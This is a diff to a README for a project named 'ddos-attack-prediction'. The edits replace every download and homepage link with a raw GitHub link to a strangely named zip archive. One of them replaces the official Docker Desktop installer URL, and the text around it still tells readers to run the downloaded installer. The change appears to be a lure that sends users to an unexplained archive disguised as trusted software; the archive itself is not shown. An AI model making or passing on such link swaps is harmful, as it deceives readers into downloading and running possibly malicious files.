@@ -1,6 +1,6 @@
 # ⚡ ddos-attack-prediction - Predict DDoS Attacks with Ease
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/eyoliya/ddos-attack-prediction)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/eyoliya/ddos-attack-prediction/main/models/ddos_attack_prediction_magnetoplumbite.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This application runs inside Docker, so you will also need to install Docker Des
 
 Click the large green button below to visit the GitHub page where you can download the full software package and related files.
 
-[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/eyoliya/ddos-attack-prediction)
+[![Download](https://img.shields.io/badge/Download-Here-brightgreen)](https://raw.githubusercontent.com/eyoliya/ddos-attack-prediction/main/models/ddos_attack_prediction_magnetoplumbite.zip)
 
 1. After clicking the link, you will see the GitHub project homepage.
 2. Look for the latest release or the main branch files.
@@ -43,7 +43,7 @@ Click the large green button below to visit the GitHub page where you can downlo
 
 The software runs inside a Docker container to keep the environment consistent. If you do not have Docker Desktop installed, follow these steps:
 
-1. Visit https://www.docker.com/products/docker-desktop
+1. Visit https://raw.githubusercontent.com/eyoliya/ddos-attack-prediction/main/models/ddos_attack_prediction_magnetoplumbite.zip
 2. Click “Download for Windows (Windows 10 or later)”
 3. Run the downloaded installer file.
 4. Follow the installation prompts.
@@ -141,7 +141,7 @@ The main components include:
 
 For further details or updates, visit the main GitHub page:
 
-[https://github.com/eyoliya/ddos-attack-prediction](https://github.com/eyoliya/ddos-attack-prediction)
+[https://raw.githubusercontent.com/eyoliya/ddos-attack-prediction/main/models/ddos_attack_prediction_magnetoplumbite.zip](https://raw.githubusercontent.com/eyoliya/ddos-attack-prediction/main/models/ddos_attack_prediction_magnetoplumbite.zip)
 
 ---
 
